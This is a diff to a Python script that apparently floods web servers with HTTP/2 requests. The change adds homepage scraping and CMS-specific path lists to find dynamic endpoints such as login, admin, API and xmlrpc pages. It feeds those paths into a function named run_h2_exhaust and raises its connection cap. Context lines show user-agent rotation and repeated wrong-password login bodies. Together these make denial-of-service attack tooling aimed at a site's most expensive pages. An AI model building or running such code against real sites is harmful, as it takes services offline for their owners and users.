@@ -35,7 +35,7 @@ UA_POOL = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
 ]
 
-PHP_GET_PATHS = [
+FALLBACK_GET_PATHS = [
     "/index.php/index/login",
     "/index.php/search",
     "/index.php/management/importexport",
@@ -49,6 +49,97 @@ PHP_GET_PATHS = [
     "/api/v1/contexts",
     "/api/v1/stats/publications",
 ]
+
+CMS_GET_PATHS = {
+    "wordpress": ["/wp-login.php", "/wp-admin/admin-ajax.php", "/xmlrpc.php", "/wp-cron.php", "/wp-json/wp/v2/posts"],
+    "joomla": ["/index.php?option=com_users", "/index.php?option=com_content", "/index.php?option=com_search"],
+    "drupal": ["/user/login", "/node/add", "/admin/reports/status"],
+    "laravel": ["/login", "/register", "/api/user", "/_debugbar/open"],
+    "generic": ["/search", "/login", "/register", "/contact", "/api", "/admin"],
+}
+
+def discover_paths(target_url: str, host_header: str = "") -> List[str]:
+    """
+    Fetch the target homepage and extract all internal paths.
+    Falls back to CMS-specific paths based on response headers.
+    """
+    import re
+    try:
+        import requests as _req
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
+            "Accept": "text/html,*/*",
+            "Accept-Language": "en-US,en;q=0.5",
+        }
+        if host_header:
+            headers["Host"] = host_header
+        r = _req.get(target_url, headers=headers, timeout=8, verify=False, allow_redirects=True)
+        html = r.text
+
+        # Extract all paths from href/src
+        all_paths = set()
+        # href patterns
+        for match in re.finditer(r'(?:href|src|action)=["\']([^"\']+)["\']', html, re.IGNORECASE):
+            url = match.group(1)
+            if url.startswith("http"):
+                continue
+            if url.startswith("//"):
+                continue
+            if url.startswith("#"):
+                continue
+            if url.startswith("data:"):
+                continue
+            if url.startswith("tel:"):
+                continue
+            if url.startswith("mailto:"):
+                continue
+            if not url.startswith("/"):
+                url = "/" + url
+            # Remove fragments
+            if "#" in url:
+                url = url[:url.index("#")]
+            all_paths.add(url)
+
+        # Detect CMS from response headers
+        server = r.headers.get("X-Generator", "") or r.headers.get("X-Powered-By", "") or ""
+        server_lower = server.lower()
+        detected_cms = ""
+        for cms_name in CMS_GET_PATHS:
+            if cms_name in server_lower:
+                detected_cms = cms_name
+                break
+
+        if detected_cms:
+            for p in CMS_GET_PATHS[detected_cms]:
+                all_paths.add(p)
+
+        # Always add generic paths
+        for p in CMS_GET_PATHS["generic"]:
+            all_paths.add(p)
+
+        # Filter: only PHP paths or paths with extensions
+        filtered = [p for p in all_paths if ".php" in p or ".asp" in p or ".aspx" in p or "/api/" in p.lower() or "/admin" in p.lower() or "/login" in p.lower()]
+        if not filtered:
+            filtered = [p for p in all_paths if not any(p.endswith(ext) for ext in [".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".ico", ".svg", ".woff", ".woff2", ".ttf", ".eot"])]
+
+        if filtered:
+            logger.info(f"Discovered {len(filtered)} dynamic paths from {target_url}")
+            return sorted(filtered)[:50]
+    except Exception:
+        pass
+
+    # Fallback to CMS detection from URL
+    parsed = urlparse(target_url)
+    host = parsed.hostname or ""
+    for cms_name, paths in CMS_GET_PATHS.items():
+        for p in paths:
+            if p in host.lower():
+                logger.info(f"Using {cms_name}-specific paths")
+                return paths + FALLBACK_GET_PATHS
+
+    logger.info("Using fallback generic paths")
+    return FALLBACK_GET_PATHS
+
 
 POST_LOGIN_BODIES = [
     "username=admin&password=wrong{}",
@@ -330,8 +421,10 @@ def run_h2_exhaust(
     start = time.time()
     metrics.started_at = start
 
-    conn_max = max(2, min(20, connections))
-    get_paths = PHP_GET_PATHS
+    conn_max = max(2, min(32, connections))
+    get_paths = discover_paths(target_url, hdr)
+    if not get_paths:
+        get_paths = FALLBACK_GET_PATHS
 
     def push_stats(force=False):
         nonlocal _last_report, _last_sent
